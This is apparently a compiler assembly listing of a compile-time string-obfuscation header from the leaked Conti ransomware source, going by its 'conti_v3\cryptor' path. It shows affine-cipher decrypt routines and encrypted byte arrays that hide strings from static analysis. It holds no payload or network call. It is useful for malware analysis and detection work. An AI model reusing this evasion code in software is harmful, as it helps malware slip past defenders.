??0?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 75	 mov	 BYTE PTR [rcx+1], 117	; 00000075H
  00007	c6 41 02 61	 mov	 BYTE PTR [rcx+2], 97	; 00000061H
  0000b	c6 41 03 14	 mov	 BYTE PTR [rcx+3], 20
  0000f	c6 41 04 61	 mov	 BYTE PTR [rcx+4], 97	; 00000061H
  00013	c6 41 05 70	 mov	 BYTE PTR [rcx+5], 112	; 00000070H
  00017	c6 41 06 61	 mov	 BYTE PTR [rcx+6], 97	; 00000061H
  0001b	c6 41 07 35	 mov	 BYTE PTR [rcx+7], 53	; 00000035H
  0001f	c6 41 08 61	 mov	 BYTE PTR [rcx+8], 97	; 00000061H
  00023	c6 41 09 61	 mov	 BYTE PTR [rcx+9], 97	; 00000061H
  00027	c6 41 0a 61	 mov	 BYTE PTR [rcx+10], 97	; 00000061H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 14 00 00
	00		 mov	 r11d, 20
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 12	 sub	 ecx, 18

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 12	 mov	 BYTE PTR [rcx+2], 18
  0000b	c6 41 03 37	 mov	 BYTE PTR [rcx+3], 55	; 00000037H
  0000f	c6 41 04 12	 mov	 BYTE PTR [rcx+4], 18
  00013	c6 41 05 2f	 mov	 BYTE PTR [rcx+5], 47	; 0000002fH
  00017	c6 41 06 12	 mov	 BYTE PTR [rcx+6], 18
  0001b	c6 41 07 37	 mov	 BYTE PTR [rcx+7], 55	; 00000037H
  0001f	c6 41 08 12	 mov	 BYTE PTR [rcx+8], 18
  00023	c6 41 09 71	 mov	 BYTE PTR [rcx+9], 113	; 00000071H
  00027	c6 41 0a 12	 mov	 BYTE PTR [rcx+10], 18
  0002b	c6 41 0b 76	 mov	 BYTE PTR [rcx+11], 118	; 00000076H
  0002f	c6 41 0c 12	 mov	 BYTE PTR [rcx+12], 18
  00033	c6 41 0d 06	 mov	 BYTE PTR [rcx+13], 6
  00037	c6 41 0e 12	 mov	 BYTE PTR [rcx+14], 18
  0003b	c6 41 0f 2f	 mov	 BYTE PTR [rcx+15], 47	; 0000002fH
  0003f	c6 41 10 12	 mov	 BYTE PTR [rcx+16], 18
  00043	c6 41 11 7e	 mov	 BYTE PTR [rcx+17], 126	; 0000007eH
  00047	c6 41 12 12	 mov	 BYTE PTR [rcx+18], 18
  0004b	c6 41 13 12	 mov	 BYTE PTR [rcx+19], 18
  0004f	c6 41 14 12	 mov	 BYTE PTR [rcx+20], 18
  00053	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00057	48 8b c1	 mov	 rax, rcx
  0005a	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5d 00 00 00	 mov	 eax, 93			; 0000005dH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3a	 mov	 BYTE PTR [rcx+1], 58	; 0000003aH
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 43	 mov	 BYTE PTR [rcx+3], 67	; 00000043H
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 45	 mov	 BYTE PTR [rcx+5], 69	; 00000045H
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	c6 41 07 27	 mov	 BYTE PTR [rcx+7], 39	; 00000027H
  0001f	c6 41 08 5d	 mov	 BYTE PTR [rcx+8], 93	; 0000005dH
  00023	c6 41 09 5d	 mov	 BYTE PTR [rcx+9], 93	; 0000005dH
  00027	c6 41 0a 5d	 mov	 BYTE PTR [rcx+10], 93	; 0000005dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1c 00 00 00	 mov	 eax, 28
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 60	 mov	 BYTE PTR [rcx+1], 96	; 00000060H
  00007	c6 41 02 1c	 mov	 BYTE PTR [rcx+2], 28
  0000b	c6 41 03 40	 mov	 BYTE PTR [rcx+3], 64	; 00000040H
  0000f	c6 41 04 1c	 mov	 BYTE PTR [rcx+4], 28
  00013	c6 41 05 32	 mov	 BYTE PTR [rcx+5], 50	; 00000032H
  00017	c6 41 06 1c	 mov	 BYTE PTR [rcx+6], 28
  0001b	c6 41 07 5d	 mov	 BYTE PTR [rcx+7], 93	; 0000005dH
  0001f	c6 41 08 1c	 mov	 BYTE PTR [rcx+8], 28
  00023	c6 41 09 1c	 mov	 BYTE PTR [rcx+9], 28
  00027	c6 41 0a 1c	 mov	 BYTE PTR [rcx+10], 28
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 21 00 00 00	 mov	 eax, 33			; 00000021H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 21	 mov	 BYTE PTR [rcx+2], 33	; 00000021H
  0000b	c6 41 03 11	 mov	 BYTE PTR [rcx+3], 17
  0000f	c6 41 04 21	 mov	 BYTE PTR [rcx+4], 33	; 00000021H
  00013	c6 41 05 6f	 mov	 BYTE PTR [rcx+5], 111	; 0000006fH
  00017	c6 41 06 21	 mov	 BYTE PTR [rcx+6], 33	; 00000021H
  0001b	c6 41 07 75	 mov	 BYTE PTR [rcx+7], 117	; 00000075H
  0001f	c6 41 08 21	 mov	 BYTE PTR [rcx+8], 33	; 00000021H
  00023	c6 41 09 53	 mov	 BYTE PTR [rcx+9], 83	; 00000053H
  00027	c6 41 0a 21	 mov	 BYTE PTR [rcx+10], 33	; 00000021H
  0002b	c6 41 0b 21	 mov	 BYTE PTR [rcx+11], 33	; 00000021H
  0002f	c6 41 0c 21	 mov	 BYTE PTR [rcx+12], 33	; 00000021H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
